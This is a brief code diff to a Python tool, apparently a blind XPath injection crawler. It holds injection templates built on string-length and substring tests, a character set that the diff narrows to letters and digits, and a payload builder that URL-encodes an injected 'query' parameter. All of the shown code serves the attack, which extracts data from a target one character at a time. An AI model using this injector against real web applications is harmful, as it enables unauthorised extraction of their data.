@@ -13,7 +13,7 @@ class XCrawler(object):
     strLength = "' and string-length({})={}"
     strSub = "' and substring({},1,{}) = '{}'"
     strConfirm = "' exists"
-    charList = string.printable
+    charList = string.ascii_letters + string.digits
 
     def __init__(self):
         args = self.set_args()
@@ -54,7 +54,7 @@ class XCrawler(object):
         return self.strConfirm in html
 
     def make_payload(self, step):
-        return urllib.urlencode({"query": "hentouane" + step + self.strTrue})
+        return urllib.urlencode({"query": "0" + step + self.strTrue})
 
     def set_args(self):
         parser = argparse.ArgumentParser()
